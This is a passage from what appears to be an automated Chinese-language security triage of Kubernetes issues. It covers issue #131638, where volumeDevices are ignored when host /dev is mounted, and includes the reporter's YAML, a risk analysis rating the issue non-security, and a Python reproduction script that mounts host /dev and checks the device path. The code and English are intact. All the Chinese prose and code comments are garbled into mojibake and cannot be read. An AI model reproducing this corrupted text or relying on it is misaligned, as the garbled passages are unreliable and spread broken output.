            print("å¦‚æœæ—¶é—´é—´éš”è¿œå°äº1ç§’ï¼ˆä¾‹å¦‚æ¯«ç§’çº§ï¼‰ï¼Œåˆ™è¯´æ˜ backoff å·²è¢«æ­£ç¡®ç¦ç”¨ã€‚")

def main():
    demonstrate_backoff_issue()

main()
```


**è§£é‡Šè¯´æ˜ï¼š**

æ­¤ Python è„šæœ¬æ˜¯ä¸€ä¸ªè¾…åŠ©éªŒè¯å·¥å…·ï¼Œç”¨äºè§‚å¯Ÿ Issue ä¸­æè¿°çš„è°ƒåº¦å™¨é€€é¿ï¼ˆbackoffï¼‰ç¼ºé™·ã€‚å®ƒæœ¬èº«ä¸åˆ©ç”¨ä»»ä½•æ¼æ´ï¼Œè€Œæ˜¯é€šè¿‡åˆ›å»ºä¸€ä¸ªç‰¹å®šçš„ Pod å¹¶è§‚å¯Ÿå…¶è°ƒåº¦è¡Œä¸ºï¼Œæ¥å¸®åŠ©ç”¨æˆ·åˆ¤æ–­å…¶ Kubernetes é›†ç¾¤æ˜¯å¦å­˜åœ¨è¯¥é—®é¢˜ã€‚

**è„šæœ¬å·¥ä½œæµç¨‹ï¼š**

1.  **å‰ç½®æ¡ä»¶è¯´æ˜**ï¼šè„šæœ¬é¦–å…ˆä¼šæ‰“å°ä¸€æ®µé‡è¦çš„è¯´æ˜ï¼Œè¦æ±‚ç”¨æˆ·åœ¨è¿è¡Œå‰å¿…é¡»æ‰‹åŠ¨ä¿®æ”¹ `kube-scheduler` çš„å¯åŠ¨å‚æ•°ï¼Œå°† `podMaxBackoffDuration` è®¾ç½®ä¸º `0s`ã€‚è¿™æ˜¯å¤ç°é—®é¢˜çš„å…³é”®å‰æã€‚
2.  **è¿æ¥é›†ç¾¤**ï¼šè„šæœ¬ä½¿ç”¨ `kubernetes` Python åº“ï¼Œä»é»˜è®¤è·¯å¾„ï¼ˆä¾‹å¦‚ `~/.kube/config`ï¼‰åŠ è½½é…ç½®ï¼Œä»¥è¿æ¥åˆ°ç”¨æˆ·çš„ Kubernetes é›†ç¾¤ã€‚
3.  **åˆ›å»ºä¸å¯è°ƒåº¦ Pod**ï¼šè„šæœ¬ä¼šå®šä¹‰å¹¶åˆ›å»ºä¸€ä¸ªç‰¹æ®Šçš„ Podã€‚è¿™ä¸ª Pod è¯·æ±‚äº†å·¨é‡çš„ CPU èµ„æºï¼ˆ`99999` æ ¸ï¼‰ï¼Œè¿™åœ¨ä»»ä½•å®é™…é›†ç¾¤ä¸­éƒ½æ˜¯æ— æ³•æ»¡è¶³çš„ã€‚è¿™ç¡®ä¿äº†è¯¥ Pod ä¼šè¢«è°ƒåº¦å™¨åˆ¤å®šä¸ºâ€œä¸å¯è°ƒåº¦â€ï¼ˆUnschedulableï¼‰ã€‚
4.  **ç›‘æ§è°ƒåº¦äº‹ä»¶**ï¼šè„šæœ¬ä½¿ç”¨ `watch` æœºåˆ¶æ¥å®æ—¶ç›‘æ§é›†ç¾¤ä¸­ä¸è¿™ä¸ªä¸å¯è°ƒåº¦ Pod ç›¸å…³çš„äº‹ä»¶ã€‚å®ƒä¸“é—¨è¿‡æ»¤ `reason` ä¸º `FailedScheduling` çš„äº‹ä»¶ï¼Œè¿™äº›äº‹ä»¶è¡¨æ˜è°ƒåº¦å™¨å°è¯•è°ƒåº¦è¯¥ Pod ä½†å¤±è´¥äº†ã€‚
5.  **è®¡ç®—æ—¶é—´é—´éš”**ï¼šæ¯å½“æ•è·åˆ°ä¸€ä¸ª `FailedScheduling` äº‹ä»¶ï¼Œè„šæœ¬ä¼šè®°å½•å…¶æ—¶é—´æˆ³ã€‚ä»ç¬¬äºŒä¸ªäº‹ä»¶å¼€å§‹ï¼Œå®ƒä¼šè®¡ç®—å½“å‰äº‹ä»¶ä¸ä¸Šä¸€ä¸ªäº‹ä»¶ä¹‹é—´çš„æ—¶é—´å·®ï¼ˆdeltaï¼‰ã€‚
6.  **ç»“æœè¾“å‡ºä¸åˆ¤æ–­**ï¼šè„šæœ¬ä¼šå®æ—¶æ‰“å°å‡ºæ•è·åˆ°çš„äº‹ä»¶å’Œè®¡ç®—å‡ºçš„æ—¶é—´é—´éš”ã€‚
    *   å¦‚æœ Issue ä¸­æè¿°çš„ç¼ºé™·å­˜åœ¨ï¼Œç”±äºéé¢„æœŸçš„ 1 ç§’é€€é¿ï¼Œè¿ç»­ä¸¤æ¬¡ `FailedScheduling` äº‹ä»¶ä¹‹é—´çš„æ—¶é—´é—´éš”ä¼šéå¸¸æ¥è¿‘ 1.0 ç§’ã€‚
    *   å¦‚æœ `podMaxBackoffDuration: 0s` çš„é…ç½®æŒ‰é¢„æœŸå·¥ä½œï¼ˆå³ç¼ºé™·ä¸å­˜åœ¨æˆ–å·²è¢«ä¿®å¤ï¼‰ï¼Œè°ƒåº¦å™¨ä¼šéå¸¸è¿…é€Ÿåœ°é‡è¯•ï¼Œäº‹ä»¶ä¹‹é—´çš„æ—¶é—´é—´éš”ä¼šéå¸¸çŸ­ï¼Œé€šå¸¸åœ¨æ¯«ç§’çº§åˆ«ã€‚
7.  **è¶…æ—¶ä¸æ¸…ç†**ï¼šè„šæœ¬è®¾ç½®äº† 120 ç§’çš„è¶…æ—¶æœºåˆ¶ï¼Œä»¥ç¡®ä¿å…¶èƒ½å¤Ÿè‡ªåŠ¨é€€å‡ºã€‚åœ¨ç»“æŸæ—¶ï¼ˆæ— è®ºæ˜¯è¶…æ—¶è¿˜æ˜¯æ­£å¸¸å®Œæˆï¼‰ï¼Œå®ƒä¼šä½¿ç”¨ `try...finally` å—æ¥ç¡®ä¿åˆ é™¤ä¹‹å‰åˆ›å»ºçš„æµ‹è¯• Podï¼Œä»¥æ¸…ç†ç¯å¢ƒã€‚

**å¦‚ä½•ä½¿ç”¨å’Œè§£è¯»ï¼š**

1.  æŒ‰ç…§è„šæœ¬å¼€å¤´çš„æç¤ºï¼Œä¿®æ”¹æ‚¨é›†ç¾¤çš„ `kube-scheduler` é…ç½®å¹¶ç­‰å¾…å…¶é‡å¯ã€‚
2.  åœ¨èƒ½å¤Ÿè®¿é—®è¯¥é›†ç¾¤çš„æœºå™¨ä¸Šè¿è¡Œæ­¤ Python è„šæœ¬ã€‚
3.  è§‚å¯Ÿè„šæœ¬çš„è¾“å‡ºã€‚å…³æ³¨ "ä¸ä¸Šæ¬¡äº‹ä»¶çš„æ—¶é—´é—´éš”" è¿™ä¸€è¡Œçš„æ—¥å¿—ã€‚å¦‚æœè¿™äº›å€¼ç¨³å®šåœ¨ 1.0 ç§’é™„è¿‘ï¼Œå°±è¯æ˜äº†è¯¥ç¼ºé™·çš„å­˜åœ¨ã€‚

---


## Issue #131638 VolumeDevices mappings ignored when /dev is volumeMounted

- Issue é“¾æ¥ï¼š[#131638](https://github.com/kubernetes/kubernetes/issues/131638)

### Issue å†…å®¹

#### What happened?

When the host system's `/dev` is mounted into a container, `volumeDevices` do not appear to get created. 

Even if `/dev` is mounted into a container, it is necessary to be able to map a volume (e.g. a PVC with `volumeMode: Block`) to a known name, because the actual path of the block device in `/dev` may vary.

#### What did you expect to happen?

I expect `volumeDevices` to be mapped no matter what other volumes are mounted into the container.

#### How can we reproduce it (as minimally and precisely as possible)?

Create a Block PVC:

```
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: test
spec:
  accessModes:
  - ReadWriteOnce
  resources:
    requests:
      storage: 1Gi
  storageClassName: ebs-gp3
  volumeMode: Block
```

Then create a pod that tries to mount it and /dev:

```
apiVersion: apps/v1
kind: Deployment
metadata:
  name: test
spec:
  selector:
    matchLabels:
      app: test
  template:
    metadata:
      labels:
        app: test
    spec:
      containers:
        - image: debian:bookworm
          name: test
          command:
            - sleep
            - infinity
          volumeMounts:
            - mountPath: /dev
              name: dev
          volumeDevices:
            - devicePath: /disks/test
              name: test
      volumes:
        - name: dev
          hostPath:
            path: /dev
            type: Directory
        - name: test
          persistentVolumeClaim:
            claimName: test

```

And observe that `/disks/test` is not created. If you remove the `/dev` volumeMount, `/disks/test` is created as expected.

#### Anything else we need to know?

Seems somewhat similar to https://github.com/kubernetes/kubernetes/issues/85624 but the container being privileged doesn't matter in this case.

#### Kubernetes version

<details>

```console
â¯ kubectl version
Client Version: v1.32.4
Kustomize Version: v5.5.0
Server Version: v1.32.3-eks-bcf3d70
```

</details>


#### Cloud provider

<details>
AWS, using EKS
</details>


#### OS version

<details>

```console
NAME="Amazon Linux"
VERSION="2023"
ID="amzn"
ID_LIKE="fedora"
VERSION_ID="2023"
PLATFORM_ID="platform:al2023"
PRETTY_NAME="Amazon Linux 2023.7.20250414"
ANSI_COLOR="0;33"
CPE_NAME="cpe:2.3:o:amazon:amazon_linux:2023"
HOME_URL="https://aws.amazon.com/linux/amazon-linux-2023/"
DOCUMENTATION_URL="https://docs.aws.amazon.com/linux/"
SUPPORT_URL="https://aws.amazon.com/premiumsupport/"
BUG_REPORT_URL="https://github.com/amazonlinux/amazon-linux-2023"
VENDOR_NAME="AWS"
VENDOR_URL="https://aws.amazon.com/"
SUPPORT_END="2029-06-30"

Linux 6.1.132-147.221.amzn2023.aarch64 #1 SMP Tue Apr  8 13:14:35 UTC 2025 aarch64 aarch64 aarch64 GNU/Linux
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>
> ctr version
Client:
  Version:  1.7.27
  Revision: 05044ec0a9a75232cad458027ca83437aae3f4da
  Go version: go1.23.7

Server:
  Version:  1.7.27
  Revision: 05044ec0a9a75232cad458027ca83437aae3f4da
  UUID: fa952131-14a2-401d-b8f2-4cd0126110ac
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
https://github.com/kubernetes-sigs/aws-ebs-csi-driver - v1.42.0
</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
æ­¤Issueæè¿°äº†ä¸€ä¸ªåœ¨ç‰¹å®šé…ç½®ä¸‹KubernetesåŠŸèƒ½ä¸ç¬¦åˆé¢„æœŸçš„è¡Œä¸ºã€‚å…·ä½“æ¥è¯´ï¼Œå½“ä¸€ä¸ªå®¹å™¨é€šè¿‡`hostPath`æŒ‚è½½äº†å®¿ä¸»æœºçš„`/dev`ç›®å½•åï¼Œå†ä½¿ç”¨`volumeDevices`å­—æ®µæ¥æ˜ å°„å—å­˜å‚¨è®¾å¤‡ï¼ˆ`volumeMode: Block`çš„PVCï¼‰åˆ°å®¹å™¨å†…çš„æŒ‡å®šè·¯å¾„æ—¶ï¼Œè¿™ä¸ªè®¾å¤‡æ˜ å°„ä¼šå¤±è´¥ï¼Œå³åœ¨å®¹å™¨å†…çœ‹ä¸åˆ°é¢„æœŸçš„è®¾å¤‡è·¯å¾„ï¼ˆå¦‚`/disks/test`ï¼‰ã€‚

ä»å®‰å…¨è§’åº¦åˆ†æï¼š
1.  **æ”»å‡»å‰æ**: è¦è§¦å‘æ­¤é—®é¢˜ï¼Œæ”»å‡»è€…ï¼ˆæˆ–ç”¨æˆ·ï¼‰å¿…é¡»æ‹¥æœ‰åœ¨Podå®šä¹‰ä¸­æŒ‡å®š`hostPath`æŒ‚è½½å®¿ä¸»æœº`/dev`ç›®å½•çš„æƒé™ã€‚è¿™æœ¬èº«æ˜¯ä¸€ä¸ªéå¸¸é«˜çš„æƒé™ï¼Œå› ä¸ºè®¿é—®å®¿ä¸»æœºçš„`/dev`ç›®å½•å¯ä»¥è¿›è¡Œå„ç§å±é™©æ“ä½œï¼Œä¾‹å¦‚ç›´æ¥è¯»å†™ç‰©ç†ç£ç›˜ã€è®¿é—®ç¡¬ä»¶è®¾å¤‡ç­‰ã€‚åœ¨å¤§å¤šæ•°å®‰å…¨çš„Kubernetesç¯å¢ƒä¸­ï¼Œè¿™ç§æƒé™ä¼šé€šè¿‡Podå®‰å…¨ç­–ç•¥ï¼ˆPSPï¼‰æˆ–Podå®‰å…¨æ ‡å‡†ï¼ˆPSAï¼‰çš„`restricted`æˆ–`baseline`ç­–ç•¥æ¥ç¦æ­¢ã€‚åªæœ‰ç‰¹æƒç”¨æˆ·æˆ–ç³»ç»Ÿçº§ç»„ä»¶æ‰å¯èƒ½è¢«æˆäºˆæ­¤æƒé™ã€‚

2.  **é—®é¢˜åæœ**: è¯¥é—®é¢˜å¯¼è‡´çš„ç›´æ¥åæœæ˜¯åº”ç”¨ç¨‹åºæ— æ³•è®¿é—®å…¶é¢„æœŸçš„å—å­˜å‚¨è®¾å¤‡ï¼Œä»è€Œå¯¼è‡´åº”ç”¨ç¨‹åºå¯åŠ¨å¤±è´¥æˆ–åŠŸèƒ½ä¸å¯ç”¨ã€‚è¿™æ˜¯ä¸€ç§é’ˆå¯¹è¯¥ç‰¹å®šPodçš„æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰ã€‚

3.  **é£é™©è¯„ä¼°**:
    *   è¯¥é—®é¢˜å¹¶æœªå¼•å…¥æ–°çš„æ¼æ´ï¼Œä¾‹å¦‚å‘½ä»¤æ‰§è¡Œã€ææƒæˆ–å®¹å™¨é€ƒé€¸ã€‚å®ƒå®é™…ä¸Šæ˜¯ä½¿ä¸€ä¸ªå·²ç»å¤„äºé«˜é£é™©é…ç½®ï¼ˆæŒ‚è½½äº†host `/dev`ï¼‰çš„Pod *ä¸§å¤±*äº†éƒ¨åˆ†åŠŸèƒ½ã€‚
    *   æ”»å‡»è€…åˆ©ç”¨æ­¤é—®é¢˜æ— æ³•å½±å“å…¶ä»–ç§Ÿæˆ·æˆ–æ›´é«˜æƒé™çš„ç”¨æˆ·ï¼Œå½±å“èŒƒå›´ä»…é™äºå…¶è‡ªå·±åˆ›å»ºçš„è¿™ä¸ªç‰¹æƒPodã€‚
    *   æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬5æ¡ï¼šâ€œåœ¨é£é™©ç±»å‹ä¸ºæ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»æ—¶ï¼Œå¦‚æœæ”»å‡»è€…éœ€è¦ä¸€å®šæƒé™æ‰èƒ½å¤Ÿå®æ–½è¯¥æ”»å‡»ï¼Œåˆ™è§†æƒ…å†µéœ€è¦é™çº§å¤„ç†ï¼Œå½“æ¼æ´åˆ©ç”¨éœ€è¦æ”»å‡»è€…å…·å¤‡åˆ›å»ºã€ä¿®æ”¹ç­‰éåªè¯»æƒé™æ—¶ï¼Œåˆ™ä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©â€ã€‚è§¦å‘æ­¤é—®é¢˜éœ€è¦åˆ›å»ºPodçš„æƒé™ï¼Œå¹¶ä¸”æ˜¯åˆ›å»ºç‰¹æƒPodçš„æƒé™ï¼Œå› æ­¤ä¸åº”è¢«è¯„ä¸ºé«˜é£é™©ã€‚
    *   æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬2æ¡ï¼Œè¯¥é—®é¢˜æ›´åå‘äºä¸€ä¸ªåŠŸèƒ½æ€§ç¼ºé™·ï¼ˆBugï¼‰ï¼Œè€Œéå®‰å…¨æ¼æ´ã€‚å®ƒæè¿°çš„æ˜¯åœ¨ä¸€ç§ï¼ˆæœ¬èº«å°±ä¸å®‰å…¨çš„ï¼‰é…ç½®ä¸‹ï¼Œå¦ä¸€ä¸ªåŠŸèƒ½ï¼ˆ`volumeDevices`ï¼‰çš„è¡Œä¸ºä¸ç¬¦åˆé¢„æœŸã€‚å®ƒæ²¡æœ‰åˆ›é€ æ–°çš„å®‰å…¨é£é™©ï¼ŒçœŸæ­£çš„å®‰å…¨é£é™©åœ¨äºå…è®¸ç”¨æˆ·æŒ‚è½½å®¿ä¸»æœºçš„`/dev`ç›®å½•ã€‚

ç»¼ä¸Šæ‰€è¿°ï¼Œè¯¥Issueæè¿°çš„æ˜¯ä¸€ä¸ªåŠŸèƒ½æ€§é—®é¢˜ï¼Œè€Œéé¡¹ç›®æœ¬èº«çš„å®‰å…¨æ¼æ´ã€‚å› æ­¤ï¼Œå…¶é£é™©è¯„çº§ä¸ºâ€œä¸æ¶‰åŠâ€ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import time
import sys
from kubernetes import client, config, stream
from kubernetes.client.rest import ApiException

# é…ç½®ä¿¡æ¯
NAMESPACE = "default"
PVC_NAME = "poc-block-pvc-test"
DEPLOYMENT_NAME = "poc-dev-mount-test"
STORAGE_CLASS_NAME = "ebs-gp3"  # !!é‡è¦!!: è¯·æ ¹æ®ä½ çš„K8sé›†ç¾¤ç¯å¢ƒä¿®æ”¹ä¸ºå¯ç”¨çš„StorageClass
APP_LABEL = "poc-app-test"
DEVICE_PATH_IN_CONTAINER = "/disks/test"
TIMEOUT_SECONDS = 120

def main():
    """
    ä¸»æ‰§è¡Œå‡½æ•°ï¼Œç”¨äºå¤ç°Issueä¸­æè¿°çš„é—®é¢˜ã€‚
    """
    try:
        # ä»é»˜è®¤ä½ç½®åŠ è½½kubeconfig
        config.load_kube_config()
        core_v1 = client.CoreV1Api()
        apps_v1 = client.AppsV1Api()
        
        print("--- Step 1: å¼€å§‹å¤ç°æµç¨‹ ---")
        
        # æ­¥éª¤ 2: åˆ›å»ºå—å­˜å‚¨æ¨¡å¼çš„PVC
        create_pvc(core_v1)
        
        # æ­¥éª¤ 3: åˆ›å»ºåŒæ—¶æŒ‚è½½äº†host /devå’ŒvolumeDevicesçš„Deployment
        create_deployment(apps_v1)
        
        # æ­¥éª¤ 4: ç­‰å¾…Podå¯åŠ¨å¹¶æ£€æŸ¥è®¾å¤‡æ˜¯å¦å­˜åœ¨
        check_device_in_pod(core_v1)

    except ApiException as e:
        print(f"Kubernetes API å‘ç”Ÿé”™è¯¯: {e.reason} (Code: {e.status})")
        print(f"è¯¦ç»†ä¿¡æ¯: {e.body}")
    except Exception as e:
        print(f"å‘ç”ŸæœªçŸ¥é”™è¯¯: {e}")
    finally:
        print("\n--- Step 5: æ¸…ç†èµ„æº ---")
        cleanup(core_v1, apps_v1)
        print("--- æ¸…ç†å®Œæˆ ---")

def create_pvc(api_instance):
    """
    åˆ›å»ºPersistentVolumeClaim
    """
    print(f"[*] æ­£åœ¨åˆ›å»ºPVC '{PVC_NAME}'...")
    pvc_body = {
        "apiVersion": "v1",
        "kind": "PersistentVolumeClaim",
        "metadata": {"name": PVC_NAME},
        "spec": {
            "accessModes": ["ReadWriteOnce"],
            "resources": {"requests": {"storage": "1Gi"}},
            "storageClassName": STORAGE_CLASS_NAME,
            "volumeMode": "Block"
        }
    }
    try:
        api_instance.create_namespaced_persistent_volume_claim(
            namespace=NAMESPACE, body=pvc_body
        )
        # ç®€å•çš„ç­‰å¾…ï¼Œå®é™…ç”Ÿäº§çº§çš„PVCå¯èƒ½éœ€è¦æ›´å¤æ‚çš„ç­‰å¾…é€»è¾‘
        print(f"[+] PVC '{PVC_NAME}' å·²åˆ›å»ºã€‚")
        time.sleep(5) 
    except ApiException as e:
        if e.status == 409: # Conflict, already exists
            print(f"[*] PVC '{PVC_NAME}' å·²å­˜åœ¨ï¼Œè·³è¿‡åˆ›å»ºã€‚")
        else:
            print(f"[!] åˆ›å»ºPVCå¤±è´¥ï¼Œè¯·æ£€æŸ¥StorageClass '{STORAGE_CLASS_NAME}' æ˜¯å¦å­˜åœ¨ä¸”å¯ç”¨ã€‚")
            raise

def create_deployment(api_instance):
    """
    åˆ›å»ºDeployment
    """
    print(f"[*] æ­£åœ¨åˆ›å»ºDeployment '{DEPLOYMENT_NAME}'...")
    deployment_body = {
        "apiVersion": "apps/v1",
        "kind": "Deployment",
        "metadata": {"name": DEPLOYMENT_NAME},
        "spec": {
            "selector": {"matchLabels": {"app": APP_LABEL}},
            "template": {
                "metadata": {"labels": {"app": APP_LABEL}},
                "spec": {
                    "containers": [{
                        "name": "test-container",
                        "image": "debian:bookworm-slim",
                        "command": ["sleep", "3600"],
                        "volumeMounts": [{
                            "mountPath": "/dev",
                            "name": "host-dev"
                        }],
                        "volumeDevices": [{
                            "devicePath": DEVICE_PATH_IN_CONTAINER,
                            "name": "block-storage"
                        }]
                    }],
                    "volumes": [
                        {
                            "name": "host-dev",
                            "hostPath": {"path": "/dev", "type": "Directory"}
                        },
                        {
                            "name": "block-storage",
                            "persistentVolumeClaim": {"claimName": PVC_NAME}
                        }
                    ]
                }
            }
        }
    }
    try:
        api_instance.create_namespaced_deployment(
            namespace=NAMESPACE, body=deployment_body
        )
        print(f"[+] Deployment '{DEPLOYMENT_NAME}' å·²åˆ›å»ºã€‚")
    except ApiException as e:
        if e.status == 409: # Conflict
             print(f"[*] Deployment '{DEPLOYMENT_NAME}' å·²å­˜åœ¨ï¼Œè·³è¿‡åˆ›å»ºã€‚")
        else:
            raise

def check_device_in_pod(api_instance):
    """
    ç­‰å¾…Podå˜ä¸ºRunningçŠ¶æ€ï¼Œç„¶åè¿›å…¥Podæ£€æŸ¥è®¾å¤‡è·¯å¾„æ˜¯å¦å­˜åœ¨
    """
    print("[*] æ­£åœ¨ç­‰å¾…Podå¯åŠ¨...")
    start_time = time.time()
    pod_name = None
    
    while time.time() - start_time < TIMEOUT_SECONDS:
        try:
            pods = api_instance.list_namespaced_pod(
                namespace=NAMESPACE, label_selector=f"app={APP_LABEL}"
            )
            if pods.items:
                pod = pods.items[0]
                pod_name = pod.metadata.name
                if pod.status.phase == 'Running':
                    print(f"[+] Pod '{pod_name}' æ­£åœ¨è¿è¡Œã€‚")
                    break
            time.sleep(5)
        except ApiException as e:
            print(f"[!] ç­‰å¾…Podå¯åŠ¨æ—¶å‡ºé”™: {e}")
            return # Abort
    
    if not pod_name:
        print(f"[!] è¶…æ—¶({TIMEOUT_SECONDS}s): æœªèƒ½æ‰¾åˆ°æˆ–å¯åŠ¨Podã€‚")
        return

    print(f"[*] æ­£åœ¨æ£€æŸ¥Pod '{pod_name}' å†…çš„è®¾å¤‡è·¯å¾„ '{DEVICE_PATH_IN_CONTAINER}'...")
    # ä½¿ç”¨ 'test -b' æ£€æŸ¥å—è®¾å¤‡æ–‡ä»¶æ˜¯å¦å­˜åœ¨
    exec_command = ["/bin/sh", "-c", f"test -b {DEVICE_PATH_IN_CONTAINER}"]

    try:
        resp = stream.stream(
            api_instance.connect_get_namespaced_pod_exec,
            pod_name,
            NAMESPACE,
            command=exec_command,
            stderr=True,
            stdin=False,
            stdout=True,
            tty=False
        )
        # streamå‡½æ•°ä¸ç›´æ¥è¿”å›é€€å‡ºç ï¼Œå¦‚æœå‘½ä»¤å¤±è´¥ä¼šæŠ›å‡ºApiException
        # ä½†å¯¹äºshell `test`å‘½ä»¤ï¼ŒæˆåŠŸæ—¶æ— è¾“å‡ºï¼Œå¤±è´¥æ—¶ä¹Ÿå¯èƒ½æ— è¾“å‡ºä½†é€€å‡ºç é0
        # ç®€å•çš„æ£€æŸ¥æ˜¯ï¼Œå¦‚æœæ²¡æŠ›å¼‚å¸¸ä¸”æ— è¾“å‡ºï¼Œå¯èƒ½æˆåŠŸã€‚ä½†æ›´å¯é çš„å®¢æˆ·ç«¯exec APIä¼šè¿”å›çŠ¶æ€ç ã€‚
        # æ­¤å¤„æˆ‘ä»¬é‡‡ç”¨ä¸€ä¸ªæ›´ç®€å•çš„æ–¹å¼ï¼šç›´æ¥åˆ—å‡ºè·¯å¾„ï¼Œçœ‹æ˜¯å¦æˆåŠŸ
        list_command = ["ls", "-l", DEVICE_PATH_IN_CONTAINER]
        resp_list = stream.stream(
            api_instance.connect_get_namespaced_pod_exec,
            pod_name,
            NAMESPACE,
            command=list_command,
            stderr=True, stdin=False, stdout=True, tty=False
        )
        print(f"[+] 'ls'å‘½ä»¤è¾“å‡º: {resp_list}")
        if resp_list and not "No such file or directory" in resp_list:
             print("\n[!!!] é¢„æœŸä¹‹å¤–çš„ç»“æœï¼šè®¾å¤‡è·¯å¾„å­˜åœ¨ï¼è¿™ä¸Issueæè¿°ä¸ç¬¦ã€‚")
        else:
             print("\n[SUCCESS] å¤ç°æˆåŠŸ: è®¾å¤‡è·¯å¾„ä¸å­˜åœ¨ã€‚")
             print(f"  - åŸå› : å½“ host /dev è¢«æŒ‚è½½æ—¶, volumeDevices æ˜ å°„è¢«å¿½ç•¥ã€‚")

    except ApiException as e:
        # å¦‚æœå‘½ä»¤æ‰§è¡Œå¤±è´¥ï¼ˆä¾‹å¦‚æ–‡ä»¶ä¸å­˜åœ¨å¯¼è‡´lså¤±è´¥ï¼‰ï¼Œä¼šæŠ›å‡ºå¼‚å¸¸
        if "No such file or directory" in e.body:
            print(f"\n[SUCCESS] å¤ç°æˆåŠŸ: è®¾å¤‡è·¯å¾„ '{DEVICE_PATH_IN_CONTAINER}' ä¸å­˜åœ¨ã€‚")
            print(f"  - åŸå› : å½“ host /dev è¢«æŒ‚è½½æ—¶, volumeDevices æ˜ å°„è¢«å¿½ç•¥ã€‚")
        else:
            print(f"\n[!] æ‰§è¡Œå‘½ä»¤æ—¶å‘ç”Ÿé¢„æœŸä¹‹å¤–çš„é”™è¯¯: {e.reason}")
            print(e.body)
            
def cleanup(core_v1, apps_v1):
    """
    æ¸…ç†åˆ›å»ºçš„èµ„æº
    """
    try:
        print(f"[*] æ­£åœ¨åˆ é™¤Deployment '{DEPLOYMENT_NAME}'...")
        apps_v1.delete_namespaced_deployment(
            name=DEPLOYMENT_NAME, namespace=NAMESPACE, body=client.V1DeleteOptions()
        )
    except ApiException as e:
        if e.status != 404:
            print(f"[!] åˆ é™¤Deploymentå¤±è´¥: {e}")
        else:
            print(f"[*] Deployment '{DEPLOYMENT_NAME}' ä¸å­˜åœ¨ï¼Œæ— éœ€åˆ é™¤ã€‚")
            
    try:
        print(f"[*] æ­£åœ¨åˆ é™¤PVC '{PVC_NAME}'...")
        core_v1.delete_namespaced_persistent_volume_claim(
            name=PVC_NAME, namespace=NAMESPACE, body=client.V1DeleteOptions()
        )
    except ApiException as e:
        if e.status != 404:
            print(f"[!] åˆ é™¤PVCå¤±è´¥: {e}")
        else:
            print(f"[*] PVC '{PVC_NAME}' ä¸å­˜åœ¨ï¼Œæ— éœ€åˆ é™¤ã€‚")

# ç›´æ¥æ‰§è¡Œmainå‡½æ•°
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥Pythonè„šæœ¬ä½¿ç”¨å®˜æ–¹çš„`kubernetes`åº“ä¸Kubernetesé›†ç¾¤è¿›è¡Œäº¤äº’ï¼Œä»¥ç¼–ç¨‹æ–¹å¼å¤ç°Issueä¸­æè¿°çš„é—®é¢˜ã€‚

1.  **ç¯å¢ƒé…ç½®**: è„šæœ¬é¡¶éƒ¨å®šä¹‰äº†ä¸€äº›å¸¸é‡ï¼Œå¦‚`NAMESPACE`ã€èµ„æºåç§°å’Œ`STORAGE_CLASS_NAME`ã€‚**è¯·ç‰¹åˆ«æ³¨æ„**ï¼š`STORAGE_CLASS_NAME`éœ€è¦æ ¹æ®æ‚¨æ‰€æµ‹è¯•çš„Kubernetesé›†ç¾¤çš„å®é™…æƒ…å†µè¿›è¡Œä¿®æ”¹ï¼Œä¾‹å¦‚åœ¨AWS EKSä¸Šå¯èƒ½æ˜¯`ebs-gp3`ï¼Œåœ¨GKEä¸Šå¯èƒ½æ˜¯`standard-rwo`ï¼Œåœ¨æœ¬åœ°Kindæˆ–Minikubeä¸­å¯èƒ½éœ€è¦å…ˆéƒ¨ç½²å­˜å‚¨æ’ä»¶ã€‚

2.  **æ‰§è¡Œæµç¨‹**:
    *   `main()`å‡½æ•°æ˜¯è„šæœ¬çš„å…¥å£ï¼Œå®ƒé¦–å…ˆåŠ è½½æœ¬åœ°çš„`kubeconfig`æ–‡ä»¶ï¼ˆé€šå¸¸ä½äº`~/.kube/config`ï¼‰æ¥è·å–é›†ç¾¤çš„è®¿é—®å‡­è¯ã€‚
    *   **Step 1: åˆ›å»ºPVC**: `create_pvc`å‡½æ•°å®šä¹‰äº†ä¸€ä¸ª`volumeMode`ä¸º`Block`çš„`PersistentVolumeClaim`ï¼Œå¹¶å‘Kubernetes API Serverè¯·æ±‚åˆ›å»ºå®ƒã€‚è¿™æ˜¯æä¾›å—å­˜å‚¨è®¾å¤‡çš„å‰æã€‚
    *   **Step 2: åˆ›å»ºDeployment**: `create_deployment`å‡½æ•°å®šä¹‰äº†ä¸€ä¸ªç‰¹æ®Šçš„`Deployment`ã€‚å…¶Podæ¨¡æ¿ä¸­åŒ…å«äº†ä¸¤ä¸ªå…³é”®é…ç½®ï¼š
        *   `volumeMounts`: ä½¿ç”¨`hostPath`å°†å®¿ä¸»æœºçš„`/dev`ç›®å½•æŒ‚è½½åˆ°å®¹å™¨å†…çš„`/dev`ã€‚
        *   `volumeDevices`: å°è¯•å°†ä¸Šä¸€æ­¥åˆ›å»ºçš„PVCï¼ˆå—è®¾å¤‡ï¼‰æ˜ å°„åˆ°å®¹å™¨å†…çš„`/disks/test`è·¯å¾„ã€‚
    *   **Step 3: æ£€æŸ¥Pod**: `check_device_in_pod`å‡½æ•°ä¼šè½®è¯¢æŸ¥è¯¢ï¼Œç›´åˆ°ç”±Deploymentåˆ›å»ºçš„Podè¿›å…¥`Running`çŠ¶æ€ã€‚ä¸€æ—¦Podè¿è¡Œï¼Œå®ƒä¼šä½¿ç”¨Kubernetes APIçš„`exec`åŠŸèƒ½ï¼Œåœ¨å®¹å™¨å†…éƒ¨æ‰§è¡Œ`test -b /disks/test`æˆ–`ls -l /disks/test`å‘½ä»¤ï¼Œæ¥æ£€æŸ¥æŒ‡å®šçš„è®¾å¤‡è·¯å¾„æ˜¯å¦å­˜åœ¨ã€‚
